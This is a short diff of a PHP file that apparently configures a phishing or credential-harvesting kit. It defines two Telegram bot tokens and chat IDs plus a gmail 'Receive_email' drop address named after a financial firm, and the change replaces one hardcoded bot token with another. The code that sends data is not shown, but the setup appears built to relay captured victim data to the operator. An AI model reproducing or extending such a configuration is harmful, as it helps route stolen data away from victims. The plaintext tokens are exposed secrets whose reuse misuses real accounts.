@@ -8,7 +8,7 @@ header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Si
 $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY";
 $id = getenv('TELEGRAM_CHAT_ID') ?: "6037378895";
 // Second bot configuration
-$botToken2 = "8473712711:AAFHdPiy_Tbdba_toqZNZccVcB59iUHa5K4";
+$botToken2 = "8764387388:AAFXqjiOiAbV51Xg7SCsL7ve45cWrbaKP8E";
 $id2 = "8228289585";
 $Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com";
 
